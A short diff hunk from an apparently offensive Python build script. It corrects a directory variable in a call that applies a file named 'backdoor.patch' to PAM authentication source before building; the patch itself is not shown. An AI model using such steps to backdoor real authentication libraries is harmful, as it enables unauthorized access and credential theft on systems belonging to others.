@@ -70,7 +70,7 @@ def build_pam(pam_dir: str):
     # run_cmd(["make"], cwd=str(pam_path))
 
     subprocess.run(
-        ["patch", "-p1", "-d", PAM_DIR], input=open("backdoor.patch", "rb").read(),
+        ["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
     )
     
     print("[+] Setting up meson")
